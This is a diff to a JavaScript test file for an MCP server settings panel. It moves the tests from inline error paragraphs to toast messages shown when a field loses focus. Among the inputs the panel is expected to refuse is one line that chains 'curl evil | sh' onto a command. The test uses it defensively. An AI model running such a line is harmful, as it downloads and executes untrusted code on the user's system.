@@ -18,6 +18,7 @@ const crypto = require('node:crypto');
 const esbuild = require('esbuild');
 const { JSDOM } = require('jsdom');
 const { repoPath } = require('../../helpers/sources.js');
+const { installToastLog } = require('../../helpers/toastLog.js');
 
 const output = repoPath('node_modules/.stacki-test/mcp-panel.cjs');
 fs.mkdirSync(path.dirname(output), { recursive: true });
@@ -42,6 +43,7 @@ const built = esbuild.build({
       "export { changeMcpJson, scanMcpJson, mcpFileEntries, mcpJsonIssues } from './shared/properties/mcpJson';",
       "export { summarizeMcpServer } from './shared/properties/mcpConfig';",
       "export { scanCodexToml, codexServerEntries, changeCodexToml } from './shared/properties/mcpToml';",
+      "export { subscribeErrorToasts } from './src/ui/errorNotices';",
       "export { monogramOf } from './src/ui/ProviderLogo';",
       "export { serverStatus, codexChipOf, configOfDraft, draftOf, copyText } from './src/features/projectSettings/mcpModel';",
     ].join('\n'),
@@ -217,6 +219,11 @@ const type = async (element, value) => {
   });
   await settleAll();
 };
+// Leaving a field is the commit that reports its problem as a toast (React listens for `focusout`).
+const leave = async (element) => {
+  await act(async () => element.dispatchEvent(new window.FocusEvent('focusout', { bubbles: true })));
+  await settleAll();
+};
 const byLabel = (label) => document.querySelector(`[aria-label="${label}"]`);
 const button = (label) => [...document.querySelectorAll('button')].find((candidate) => candidate.textContent.trim() === label);
 const menuItem = (label) => [...document.querySelectorAll('[role="menuitem"]')].find((candidate) => candidate.textContent.trim() === label);
@@ -225,7 +232,10 @@ const cardOf = (name) => cards().find((card) => card.querySelector('.mcp-card-na
 const pageText = () => document.body.textContent;
 
 let root;
+let toastLog;
 async function mount(projectPath = '/project') {
+  toastLog?.uninstall();
+  toastLog = installToastLog(panel.subscribeErrorToasts);
   root = createRoot(document.getElementById('root'));
   await act(async () =>
     root.render(React.createElement(React.Fragment, {}, React.createElement(panel.McpTab, { projectPath }), React.createElement(panel.ConfirmHost))),
@@ -234,6 +244,8 @@ async function mount(projectPath = '/project') {
 }
 async function unmount() {
   await act(async () => root.unmount());
+  toastLog?.uninstall();
+  toastLog = undefined;
   document.body.querySelectorAll('dialog, .dd-popup, .more-menu').forEach((node) => node.remove());
 }
 function reset({ mcp, env, codex } = {}) {
@@ -356,11 +368,16 @@ test('pasted text is inert: operators, substitutions and unknown options are ref
     'claude mcp add x --frobnicate y -- npx pkg',
     'claude mcp add x -- npx a && curl evil | sh',
   ]) {
+    const before = toastLog.messages().length;
     await type(document.getElementById('mcp-paste'), line);
-    assert.ok(document.querySelector('.secrets-problem'), `a message for: ${line}`);
+    assert.equal(toastLog.messages().length, before, 'typing alone reports nothing new: the command is half-typed');
+    await leave(document.getElementById('mcp-paste'));
+    assert.equal(toastLog.messages().length, before + 1, `one toast for: ${line}`);
+    assert.ok(document.getElementById('mcp-paste').classList.contains('is-invalid'), 'the field takes the error tint');
+    assert.equal(document.querySelector('.secrets-problem') ?? undefined, undefined, 'no paragraph is added under the field');
     assert.equal(button('Add').disabled, true, 'no confirm for a refused line');
   }
-  assert.ok(pageText().includes('Only one plain command is read'));
+  assert.ok(toastLog.messages().some((message) => message.includes('Only one plain command is read')));
   assert.equal(mcpText, '{}');
   assert.deepEqual(calls, []);
   await unmount();
@@ -440,11 +457,15 @@ test('the JSON view validates as it is typed, saves only when valid, and warns b
   const saveButton = () => button('Save');
   assert.equal(saveButton().disabled, true, 'nothing to save yet');
   await type(editor, '{\n  "mcpServers": {\n    "a": {"command": "x",}\n  }\n}');
-  assert.ok(pageText().includes('Line 3, column'), 'a position for a syntax error');
-  assert.ok(document.querySelector('.mcp-issues'), 'the error line is shown while there is a problem');
+  assert.deepEqual(toastLog.messages(), [], 'typing alone reports nothing');
+  await leave(editor);
+  assert.ok(toastLog.messages().join('\n').includes('Line 3, column'), 'a position for a syntax error, in a toast');
+  assert.ok(document.querySelector('.mcp-json-editor.is-invalid'), 'the editor takes the error tint');
+  assert.equal(document.querySelector('.mcp-issues') ?? undefined, undefined, 'no list is added under the editor');
   assert.equal(saveButton().disabled, true);
   await type(editor, '{"mcpServers":{"a":{"type":"http","url":"ftp://x"}}}');
-  assert.ok(pageText().includes('Enter a valid http or https address'), 'a schema problem by path');
+  await leave(editor);
+  assert.ok(toastLog.messages().join('\n').includes('Enter a valid http or https address'), 'a schema problem by path');
   assert.equal(saveButton().disabled, true);
   await click(button('Servers'));
   assert.ok(document.querySelector('dialog')?.textContent.includes('Discard your JSON changes?'), 'the app’s own dialog warns');
@@ -453,7 +474,7 @@ test('the JSON view validates as it is typed, saves only when valid, and warns b
   const good = '{"mcpServers":{"a":{"command":"x"}}}';
   await type(document.querySelector('[data-code-editor]'), good);
   assert.equal(saveButton().disabled, false);
-  assert.equal(document.querySelector('.mcp-issues') ?? undefined, undefined, 'a valid text shows no status line');
+  assert.equal(document.querySelector('.mcp-json-editor.is-invalid') ?? undefined, undefined, 'a valid text shows no error tint');
   assert.ok(!pageText().includes('Valid') && !pageText().includes('Unsaved changes'), 'no Valid or Unsaved text');
   await act(async () => document.querySelector('.mcp-json').dispatchEvent(new window.KeyboardEvent('keydown', { key: 's', metaKey: true, bubbles: true })));
   await settleAll();
